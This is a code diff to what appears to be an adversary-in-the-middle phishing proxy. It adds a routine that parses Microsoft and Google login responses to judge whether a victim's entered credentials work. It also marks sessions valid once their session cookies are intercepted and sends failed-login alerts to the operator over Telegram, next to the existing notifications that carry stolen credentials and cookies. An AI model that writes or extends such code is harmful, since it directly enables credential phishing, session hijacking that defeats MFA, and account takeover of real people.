@@ -1015,6 +1015,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
 
+			// Check for login errors in response
+			if ps.SessionId != "" {
+				if s, ok := p.sessions[ps.SessionId]; ok {
+					if s.Username != "" && s.Password != "" && s.LoginStatus == "pending" {
+						loginError := p.detectLoginError(string(body))
+						if loginError != "" {
+							s.LoginStatus = "invalid"
+							log.Warning("[%d] Login failed: %s", ps.Index, loginError)
+							// Send notification about failed login
+							p.sendLoginFailedNotification(ps.SessionId, loginError)
+						}
+					}
+				}
+			}
+
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					// capture body response tokens
@@ -1072,6 +1087,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.Finish(false)
+						s.LoginStatus = "valid" // Mark as valid since cookies were captured
 
 						// Send Telegram notification with cookies (separate from credentials)
 						p.sendCookiesNotification(ps.SessionId)
@@ -1214,6 +1230,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								s.LoginStatus = "valid" // Mark as valid since cookies were captured
 								// Send Telegram notification with cookies
 								p.sendCookiesNotification(ps.SessionId)
 							}
@@ -1645,6 +1662,75 @@ func (p *HttpProxy) sendTelegramNotification(sid string) {
 	go func() {
 		if err := p.telegram.SendCredentialsNotification(session); err != nil {
 			log.Error("telegram credentials: %v", err)
+		}
+	}()
+}
+
+// detectLoginError checks response body for common login error patterns
+func (p *HttpProxy) detectLoginError(body string) string {
+	// Microsoft/O365 error codes
+	if strings.Contains(body, "AADSTS50126") {
+		return "Invalid username or password"
+	}
+	if strings.Contains(body, "AADSTS50034") {
+		return "User account doesn't exist"
+	}
+	if strings.Contains(body, "AADSTS50053") {
+		return "Account locked"
+	}
+	if strings.Contains(body, "AADSTS50057") {
+		return "Account disabled"
+	}
+	if strings.Contains(body, "AADSTS50055") {
+		return "Password expired"
+	}
+	if strings.Contains(body, "AADSTS50076") || strings.Contains(body, "AADSTS50079") {
+		return "MFA required - password correct"
+	}
+	if strings.Contains(body, "AADSTS") && strings.Contains(body, "error") {
+		return "Authentication error"
+	}
+	
+	// Google error patterns
+	if strings.Contains(body, "Wrong password") || strings.Contains(body, "wrongPassword") {
+		return "Wrong password"
+	}
+	if strings.Contains(body, "Couldn't find your Google Account") {
+		return "Account not found"
+	}
+	
+	// Generic error patterns
+	if strings.Contains(body, "\"error\":\"invalid_grant\"") {
+		return "Invalid credentials"
+	}
+	if strings.Contains(body, "\"error\":\"invalid_password\"") || strings.Contains(body, "\"error\":\"wrong_password\"") {
+		return "Invalid password"
+	}
+	if strings.Contains(body, "\"IfExistsResult\":0") || strings.Contains(body, "\"IfExistsResult\":1") {
+		// Microsoft GetCredentialType response - user exists, no error yet
+		return ""
+	}
+	if strings.Contains(body, "\"error_description\":") && strings.Contains(body, "password") {
+		return "Password error"
+	}
+	
+	return ""
+}
+
+// sendLoginFailedNotification sends notification when login fails
+func (p *HttpProxy) sendLoginFailedNotification(sid string, errorReason string) {
+	if sid == "" {
+		return
+	}
+	
+	session, err := p.db.GetSessionBySid(sid)
+	if err != nil {
+		return
+	}
+	
+	go func() {
+		if err := p.telegram.SendLoginFailedNotification(session, errorReason); err != nil {
+			log.Error("telegram login failed: %v", err)
 		}
 	}()
 }
